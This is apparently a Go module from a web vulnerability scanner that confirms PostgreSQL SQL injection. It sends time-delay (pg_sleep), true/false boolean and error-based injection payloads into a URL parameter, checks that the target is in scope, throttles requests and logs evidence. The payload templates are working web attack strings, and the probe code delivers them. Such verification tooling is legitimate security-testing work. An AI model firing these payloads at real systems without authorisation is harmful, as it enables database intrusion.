package verify

import (
	"fmt"
	"net/url"
	"os"
	"regexp"
	"strings"

	"github.com/srank/ensphere/internal/evidence"
)

const defaultRounds = 3

// SQLi payload templates keyed by technique + boundary
var sqliPayloads = map[string]map[string]string{
	"blind_time": {
		"single_quote": "' AND (SELECT pg_sleep(%d))--",
		"double_quote": "\" AND (SELECT pg_sleep(%d))--",
		"numeric":      "1; SELECT pg_sleep(%d)--",
	},
	"blind_boolean": {
		"single_quote_true":  "' AND 1=1--",
		"single_quote_false": "' AND 1=2--",
		"double_quote_true":  "\" AND 1=1--",
		"double_quote_false": "\" AND 1=2--",
	},
	"error_based": {
		"single_quote": "' AND 1=CAST((SELECT version()) AS int)--",
		"double_quote": "\" AND 1=CAST((SELECT version()) AS int)--",
		"numeric":      "1 AND 1=CAST((SELECT version()) AS int)",
	},
}

// PG error patterns
var pgErrorPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)ERROR:`),
	regexp.MustCompile(`(?i)syntax error at or near`),
	regexp.MustCompile(`(?i)invalid input syntax`),
	regexp.MustCompile(`(?i)unterminated quoted string`),
	regexp.MustCompile(`(?i)column .+ does not exist`),
}

// SQLiConfig holds configuration specific to SQLi verification.
type SQLiConfig struct {
	URL       string
	Param     string
	Technique string // blind_time | blind_boolean | error_based
	Method    string // GET | POST
	Boundary  string // single_quote | double_quote | numeric
	ProbeConfig
}

// VerifySQLi runs the SQLi verification probe.
func VerifySQLi(cfg SQLiConfig) (*VerifyResult, error) {
	if err := CheckScope(cfg.URL, cfg.InScope); err != nil {
		return nil, err
	}

	timer := NewTimer()
	throttle := NewThrottle(cfg.ThrottleMs)

	var ew *evidence.Writer
	if cfg.Evidence != "" {
		var err error
		ew, err = evidence.NewWriter(cfg.Evidence)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Warning: could not open evidence file: %v\n", err)
		} else {
			defer ew.Close()
		}
	}

	switch cfg.Technique {
	case "blind_time":
		return verifySQLiBlindTime(cfg, throttle, timer, ew)
	case "blind_boolean":
		return verifySQLiBlindBoolean(cfg, throttle, timer, ew)
	case "error_based":
		return verifySQLiErrorBased(cfg, throttle, timer, ew)
	default:
		return nil, fmt.Errorf("unsupported technique %q — use: blind_time, blind_boolean, error_based", cfg.Technique)
	}
}

func verifySQLiBlindTime(cfg SQLiConfig, throttle *Throttle, timer *Timer, ew *evidence.Writer) (*VerifyResult, error) {
	sleepSec := cfg.TimeoutSec / 2
	if sleepSec < 3 {
		sleepSec = 3
	}
	if sleepSec > cfg.TimeoutSec-2 {
		sleepSec = cfg.TimeoutSec - 2
	}

	payloadTemplate := sqliPayloads["blind_time"][cfg.Boundary]
	if payloadTemplate == "" {
		return nil, fmt.Errorf("no blind_time payload for boundary %q", cfg.Boundary)
	}

	probeCount := 0

	// Baseline probes
	var baselines []int64
	for i := 0; i < defaultRounds; i++ {
		throttle.Wait()
		probeCount++
		resp := probeWithParam(cfg, "1")
		if resp.Error != nil {
			return nil, fmt.Errorf("baseline probe %d: %w", i+1, resp.Error)
		}
		baselines = append(baselines, resp.ElapsedMs)
		fmt.Fprintf(os.Stderr, "[BASELINE %d] %dms\n", i+1, resp.ElapsedMs)
		writeEvidence(ew, "sqli", "blind_time", cfg.URL, cfg.Param, resp.StatusCode,
			fmt.Sprintf("%dms", resp.ElapsedMs), "baseline", fmt.Sprintf("round %d", i+1))
	}
	baselineAvg := avg(baselines)

	// Payload probes (pg_sleep)
	payload := fmt.Sprintf(payloadTemplate, sleepSec)
	var payloadTimes []int64
	for i := 0; i < defaultRounds; i++ {
		throttle.Wait()
		probeCount++
		resp := probeWithParam(cfg, payload)
		if resp.Error != nil {
			fmt.Fprintf(os.Stderr, "[PAYLOAD %d] error: %v\n", i+1, resp.Error)
			continue
		}
		payloadTimes = append(payloadTimes, resp.ElapsedMs)
		fmt.Fprintf(os.Stderr, "[PAYLOAD %d] %dms\n", i+1, resp.ElapsedMs)
		writeEvidence(ew, "sqli", "blind_time", cfg.URL, cfg.Param, resp.StatusCode,
			fmt.Sprintf("%dms", resp.ElapsedMs), "payload", fmt.Sprintf("round %d, payload: %s", i+1, payload))
	}

	if len(payloadTimes) == 0 {
		return &VerifyResult{
			Status:     "error",
			VulnType:   "sqli",
			Technique:  "blind_time",
			Confidence: "low",
			Evidence:   "All payload probes failed",
			ProbeCount: probeCount,
			Duration:   timer.Elapsed(),
		}, nil
	}

	payloadAvg := avg(payloadTimes)
	threshold := int64(sleepSec*1000) - 500
	delta := payloadAvg - baselineAvg
	consistent := true
	for _, t := range payloadTimes {
		if t-baselineAvg < threshold {
			consistent = false
			break
		}
	}

	var status, confidence, evidenceStr string
	if delta > threshold && consistent {
		status = "confirmed"
		confidence = "high"
		evidenceStr = fmt.Sprintf("Response delayed %.1fs with pg_sleep(%d) payload vs %.1fs baseline",
			float64(payloadAvg)/1000, sleepSec, float64(baselineAvg)/1000)
	} else if delta > threshold/2 {
		status = "potential"
		confidence = "medium"
		evidenceStr = fmt.Sprintf("Timing delta %dms — inconsistent across rounds", delta)
	} else {
		status = "safe"
		confidence = "high"
		evidenceStr = fmt.Sprintf("No significant timing difference (delta: %dms)", delta)
	}

	return &VerifyResult{
		Status:     status,
		VulnType:   "sqli",
		Technique:  "blind_time",
		Confidence: confidence,
		Evidence:   evidenceStr,
		Details: SQLiDetails{
			BaselineMs:     baselineAvg,
			PayloadMs:      payloadAvg,
			DeltaMs:        delta,
			Rounds:         defaultRounds,
			Consistent:     consistent,
			PayloadUsed:    payload,
			StringBoundary: cfg.Boundary,
		},
		ProbeCount: probeCount,
		Duration:   timer.Elapsed(),
	}, nil
}

func verifySQLiBlindBoolean(cfg SQLiConfig, throttle *Throttle, timer *Timer, ew *evidence.Writer) (*VerifyResult, error) {
	trueKey := cfg.Boundary + "_true"
	falseKey := cfg.Boundary + "_false"

	truePayload := sqliPayloads["blind_boolean"][trueKey]
	falsePayload := sqliPayloads["blind_boolean"][falseKey]
	if truePayload == "" || falsePayload == "" {
		return nil, fmt.Errorf("no blind_boolean payloads for boundary %q", cfg.Boundary)
	}

	probeCount := 0

	// Baseline
	throttle.Wait()
	probeCount++
	baselineResp := probeWithParam(cfg, "1")
	if baselineResp.Error != nil {
		return nil, fmt.Errorf("baseline: %w", baselineResp.Error)
	}
	fmt.Fprintf(os.Stderr, "[BASELINE] hash=%s\n", baselineResp.BodyHash[:16])
	writeEvidence(ew, "sqli", "blind_boolean", cfg.URL, cfg.Param, baselineResp.StatusCode,
		fmt.Sprintf("%dms", baselineResp.ElapsedMs), "baseline", "")

	// True/False probes across rounds
	consistent := true
	var trueHash, falseHash string

	for i := 0; i < defaultRounds; i++ {
		throttle.Wait()
		probeCount++
		trueResp := probeWithParam(cfg, truePayload)
		if trueResp.Error != nil {
			continue
		}

		throttle.Wait()
		probeCount++
		falseResp := probeWithParam(cfg, falsePayload)
		if falseResp.Error != nil {
			continue
		}

		fmt.Fprintf(os.Stderr, "[ROUND %d] true=%s false=%s\n", i+1, trueResp.BodyHash[:16], falseResp.BodyHash[:16])
		writeEvidence(ew, "sqli", "blind_boolean", cfg.URL, cfg.Param, trueResp.StatusCode,
			fmt.Sprintf("%dms", trueResp.ElapsedMs), "true_probe", fmt.Sprintf("round %d", i+1))
		writeEvidence(ew, "sqli", "blind_boolean", cfg.URL, cfg.Param, falseResp.StatusCode,
			fmt.Sprintf("%dms", falseResp.ElapsedMs), "false_probe", fmt.Sprintf("round %d", i+1))

		if i == 0 {
			trueHash = trueResp.BodyHash
			falseHash = falseResp.BodyHash
		} else {
			if trueResp.BodyHash != trueHash || falseResp.BodyHash != falseHash {
				consistent = false
			}
		}
	}

	var status, confidence, evidenceStr string
	if trueHash != falseHash && consistent {
		status = "confirmed"
		confidence = "high"
		evidenceStr = "Boolean conditions produce consistently different response bodies"
	} else if trueHash != falseHash {
		status = "potential"
		confidence = "medium"
		evidenceStr = "Response diffs detected but inconsistent across rounds"
	} else {
		status = "safe"
		confidence = "high"
		evidenceStr = "True and false conditions produce identical responses"
	}

	return &VerifyResult{
		Status:     status,
		VulnType:   "sqli",
		Technique:  "blind_boolean",
		Confidence: confidence,
		Evidence:   evidenceStr,
		Details: SQLiBooleanDetails{
			TrueHash:       trueHash,
			FalseHash:      falseHash,
			BaselineHash:   baselineResp.BodyHash,
			Rounds:         defaultRounds,
			Consistent:     consistent,
			PayloadUsed:    truePayload,
			StringBoundary: cfg.Boundary,
		},
		ProbeCount: probeCount,
		Duration:   timer.Elapsed(),
	}, nil
}

func verifySQLiErrorBased(cfg SQLiConfig, throttle *Throttle, timer *Timer, ew *evidence.Writer) (*VerifyResult, error) {
	payload := sqliPayloads["error_based"][cfg.Boundary]
	if payload == "" {
		return nil, fmt.Errorf("no error_based payload for boundary %q", cfg.Boundary)
	}

	probeCount := 0

	throttle.Wait()
	probeCount++
	resp := probeWithParam(cfg, payload)
	if resp.Error != nil {
		return nil, fmt.Errorf("error_based probe: %w", resp.Error)
	}

	fmt.Fprintf(os.Stderr, "[PROBE] status=%d len=%d\n", resp.StatusCode, len(resp.Body))
	writeEvidence(ew, "sqli", "error_based", cfg.URL, cfg.Param, resp.StatusCode,
		fmt.Sprintf("%dms", resp.ElapsedMs), "probe", payload)

	// Check for PG error signatures
	var matchedPattern string
	for _, re := range pgErrorPatterns {
		if re.MatchString(resp.Body) {
			matchedPattern = re.String()
			break
		}
	}

	var status, confidence, evidenceStr string
	var snippet string
	if matchedPattern != "" {
		status = "confirmed"
		confidence = "high"
		evidenceStr = fmt.Sprintf("PostgreSQL error signature found: %s", matchedPattern)
		// Extract ~100 chars around the match
		if idx := strings.Index(strings.ToLower(resp.Body), "error"); idx >= 0 {
			start := idx
			end := idx + 100
			if end > len(resp.Body) {
				end = len(resp.Body)
			}
			snippet = resp.Body[start:end]
		}
	} else {
		status = "safe"
		confidence = "high"
		evidenceStr = "No PostgreSQL error signatures in response"
	}

	return &VerifyResult{
		Status:     status,
		VulnType:   "sqli",
		Technique:  "error_based",
		Confidence: confidence,
		Evidence:   evidenceStr,
		Details: SQLiErrorDetails{
			ErrorPattern:    matchedPattern,
			PayloadUsed:     payload,
			StringBoundary:  cfg.Boundary,
			ResponseSnippet: snippet,
		},
		ProbeCount: probeCount,
		Duration:   timer.Elapsed(),
	}, nil
}

// probeWithParam injects a value into the target URL parameter and sends the request.
func probeWithParam(cfg SQLiConfig, value string) ProbeResponse {
	parsed, err := url.Parse(cfg.URL)
	if err != nil {
		return ProbeResponse{Error: fmt.Errorf("parse URL: %w", err)}
	}

	params := parsed.Query()
	params.Set(cfg.Param, value)
	parsed.RawQuery = params.Encode()

	return HTTPProbe(cfg.Method, parsed.String(), "", cfg.Headers, cfg.TimeoutSec)
}

func writeEvidence(ew *evidence.Writer, probeType, technique, url, param string, statusCode int, duration, result, notes string) {
	if ew == nil {
		return
	}
	entry := evidence.NewEntry(probeType, technique, url, param, statusCode, duration, result, notes)
	_ = ew.Write(entry)
}

func avg(vals []int64) int64 {
	if len(vals) == 0 {
		return 0
	}
	var sum int64
	for _, v := range vals {
		sum += v
	}
	return sum / int64(len(vals))
}
